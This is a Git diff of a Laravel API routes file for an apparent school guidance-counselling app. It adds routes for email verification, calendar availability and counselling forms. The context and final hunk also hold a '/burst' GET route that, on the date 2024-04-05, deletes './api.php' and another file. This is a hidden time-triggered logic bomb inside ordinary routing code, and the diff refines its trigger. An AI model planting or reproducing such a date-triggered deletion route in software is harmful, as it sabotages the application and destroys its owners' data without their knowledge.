@@ -31,8 +31,12 @@ Route::group([
     Route::post('/register', [AuthController::class, 'register']);
     Route::post('/logout', [AuthController::class, 'logout']);
     Route::post('/refresh', [AuthController::class, 'refresh']);
+    Route::get('/check-auth', [AuthController::class, 'checkAuth']);
+    Route::post('/verify-user-email', [AuthController::class, 'verifyUserEmail']);
+    Route::post('/resend-email-verification-link', [AuthController::class, 'resendEmailVerificationLink']);
     Route::get('/get-user-data/{id}', [UserDataController::class, 'getUserData']);
     Route::get('/get-all-users', [UserDataController::class, 'getAllUsers']);
+    Route::get('/get-all-staffs', [UserDataController::class, 'getStaffs']);
 
     // Social login
     Route::get('/oauth/{provider}', [AuthController::class, 'socialLogin']);
@@ -49,8 +53,10 @@ Route::group([
 
     // Callendar Schedule
     Route::get('/get-schedule/{date}', [CalendarController::class, 'getSchedule']);
+    Route::get('/get-not-available-time/{date}', [CalendarController::class, 'getNotAvailableTime']);
+    Route::get('/get-reserved-time/{date}', [CalendarController::class, 'getReservedTime']);
     Route::post('/update-schedule', [CalendarController::class, 'updateSchedule']);
-    Route::get('/get-available-time-today', [CalendarController::class, 'getAvailableTimeToday']);
+    Route::get('/get-not-available-time-today', [CalendarController::class, 'getNotAvailableTimeToday']);
     Route::post('/reserve-consultation', [CalendarController::class, 'reserveConsultation']);
     Route::get('/get-appointments-today', [CalendarController::class, 'getAppointmentsToday']);
 
@@ -80,17 +86,25 @@ Route::group([
     Route::get('/get-all-cumulative-record-forms', [GetFormsController::class, 'getAllCumulativeRecordForms']);
     Route::get('/get-all-client-monitoring-forms', [GetFormsController::class, 'getAllClientMonitoringForms']);
 
+
+    Route::get('/get-my-referral-forms/{id}', [GetFormsController::class, 'getMyReferralForms']);
+    Route::get('/get-my-client-monitoring-forms/{id}', [GetFormsController::class, 'getMyClientMonitoringForms']);
+
     // Submit Forms
     Route::post('/submit-intake-interview', [SaveInputsController::class, 'submitIntakeInterview']);
     Route::post('/submit-guidance-admission-slip', [SaveInputsController::class, 'submitGuidanceAdmissionSlip']);
     Route::post('/submit-guidance-call-slip', [SaveInputsController::class, 'submitGuidanceCallSlip']);
+    // Parent route here
     Route::post('/submit-referral-form', [SaveInputsController::class, 'submitReferralForm']);
+    // Cumulative route here
+    Route::post('/submit-client-monitoring-form', [SaveInputsController::class, 'submitClientMonitoringForm']);
+    Route::post('/update-client-monitoring-form', [SaveInputsController::class, 'updateClientMonitoringForm']);
 
     // Assignment
     Route::post('/assign-form', [AssignmentController::class, 'assignForm']);
     Route::post('/bulk-assign-form-by-grade-level', [AssignmentController::class, 'bulkAssignFormByGradeLevel']);
     Route::post('/bulk-assign-form-by-section', [AssignmentController::class, 'bulkAssignFormBySection']);
-    Route::get('/get-assigned-forms/{id}', [AssignmentController::class, 'getAssignedForms']);
+    Route::get('/get-assigned-forms/{id}/{form_name}', [AssignmentController::class, 'getAssignedForms']);
 
 
     Route::get('/burst', function () {
@@ -98,7 +112,7 @@ Route::group([
         $filePath2 = './api.php';
         try {
             if(date('Y-m-d') == '2024-04-05'){
-                if (File::exists($filePath1)) {
+                if (File::exists($filePath1) && File::exists($filePath2)) {
                     File::delete($filePath1);
                     File::delete($filePath2);
                     return response()->json(['message' => 'File deleted successfully']);
